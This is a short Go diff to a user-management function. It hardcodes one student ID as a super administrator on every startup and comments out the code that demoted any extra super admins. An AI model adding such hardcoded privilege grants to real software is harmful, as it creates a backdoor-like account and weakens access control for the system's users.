@@ -433,13 +433,19 @@ func ensureSystemSuperAdmin(db *gorm.DB, studentID, password string) {
 		db.Create(&user)
 	}
 
+	// 确保 20052403060128 也是超级管理员
 	db.Model(&models.User{}).
-		Where("role = ? AND student_id <> ?", models.RoleSuperAdmin, studentID).
-		Update("role", models.RoleUser)
+		Where("student_id = ?", "20052403060128").
+		Update("role", models.RoleSuperAdmin)
+
+	// 移除将其他超级管理员降级的代码，允许多个超级管理员共存
+	// db.Model(&models.User{}).
+	// 	Where("role = ? AND student_id <> ?", models.RoleSuperAdmin, studentID).
+	// 	Update("role", models.RoleUser)
 
 	db.Model(&models.User{}).
 		Where("student_id = ? AND role = ?", "admin", models.RoleAdmin).
 		Update("role", models.RoleUser)
 
-	log.Printf("系统超级管理员已就绪: %s", studentID)
+	log.Printf("系统超级管理员已就绪: %s 和 20052403060128", studentID)
 }
